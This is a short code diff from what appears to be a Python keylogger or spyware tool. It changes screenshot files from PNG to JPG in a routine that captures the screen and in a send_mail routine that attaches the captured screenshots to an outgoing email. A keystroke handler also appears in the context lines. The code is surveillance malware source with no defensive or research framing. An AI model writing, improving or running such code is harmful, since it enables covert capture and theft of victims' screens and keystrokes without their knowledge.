@@ -29,7 +29,7 @@ def get_time(day=False) -> str:
 def get_screenshot() -> None:
   idx = len(listdir("./s_manifest"))
   ss = screenshot()
-  ss.save(f"./s_manifest/ss_{idx}.png")
+  ss.save(f"./s_manifest/ss_{idx}.jpg")
 
 
 def keyboard_press(key: Key) -> None:
@@ -130,10 +130,10 @@ def send_mail() -> None:
 
     print("Attaching screenshots")
     for f in listdir("./s_manifest"):
-      if not f.endswith(".png"):
+      if not f.endswith(".jpg"):
         continue
       with open(f"./s_manifest/{f}", "rb") as ipath:
-        p = MIMEApplication(ipath.read(), _subtype="png")
+        p = MIMEApplication(ipath.read(), _subtype="jpg")
         p.add_header("Content-Disposition", f"attachment; filename={f}")
         message.attach(p)
 
